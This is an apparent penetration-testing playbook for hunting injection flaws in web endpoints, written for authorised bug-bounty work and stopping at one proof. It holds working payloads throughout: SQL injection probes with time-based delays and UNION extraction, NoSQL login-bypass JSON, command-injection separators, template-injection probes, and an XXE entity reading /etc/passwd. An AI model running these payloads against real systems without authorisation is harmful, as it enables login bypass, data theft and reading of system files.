# Workflow 07 — Hunt injection

Run this on any endpoint that takes structured input. Time box: 90 minutes.
Detection first; one proof, then stop.

---

## Step 1 — Rank the inputs (10 min)

Highest yield first:

1. Numeric ids in paths (`/orders/1042`).
2. Sort/filter params (`?sort=`, `?filter[price]=`).
3. Search (`?q=`).
4. JSON body string fields.
5. GraphQL arguments.
6. Report/export date ranges.
7. "Hidden" params the frontend dropped but the backend reads.

---

## Step 2 — SQL detection (25 min)

For each input, send a quote and compare:

```
normal      → 200, normal
normal'     → 500 or change
normal''    → 200, normal again (the signal)
```

If the pattern holds, test boolean:

```
' AND 1=1--     → normal
' AND 1=2--     → different
```

Confirm with time:

```
' AND SLEEP(3)--          (MySQL)
'; WAITFOR DELAY '0:0:3'-- (MSSQL)
' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- (Postgres)
```

Three tries each. A delay that scales with the number is real.

---

## Step 3 — Extract minimally (20 min)

One of:

```
' UNION SELECT version(),user(),database()-- -
' UNION SELECT table_name FROM information_schema.tables LIMIT 1-- -
```

One response with a row is the proof. Do **not** dump tables. If the program
allows sqlmap, use `--level=2 --risk=1 --technique=T` and stop at confirmation.

---

## Step 4 — NoSQL (10 min)

JSON auth or query:

```json
{"email":{"$ne":null},"password":{"$ne":null}}
{"email":{"$regex":"^admin"},"password":{"$ne":null}}
```

Query string: `?email[$ne]=x`. Array: `username[]=admin`. A login bypass is
Critical.

---

## Step 5 — Command / SSTI / XXE (15 min)

**Command:** filenames, image/PDF converters, ping tools.

```
; id    | id    $(id)    `id`    && id
```

**SSTI:** fields rendered in emails/PDFs.

```
{{7*7}}    ${7*7}    #{7*7}    <%= 7*7 %>
```

**XXE:** any XML/SOAP/SAML/SVG/DOCX:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

---

## Step 6 — Prove impact, not just behaviour

- SQL: a returned row.
- Command: `id` output.
- SSTI: `49` from `{{7*7}}`, then `id` via the engine gadget.
- XXE: a file's first line or a listener hit.

A 500 alone is **not** a finding.

---

## Step 7 — Report

One request, one response, one extraction. Run `checklists/injection.md`.

Example:

```
POST /api/search
q=x' UNION SELECT version(),user(),database()-- -
→ 200 ["8.0.32","app@db","shop"]
```

---

## Definition of done

- [ ] Inputs ranked.
- [ ] SQL boolean + time confirmed or excluded.
- [ ] NoSQL tested.
- [ ] Command/SSTI/XXE tested where relevant.
- [ ] One proof captured.
- [ ] Report written.

If every quote is reflected unchanged and no delay appears, close it and move
on. Do not burn an hour on a WAF that is doing its job.
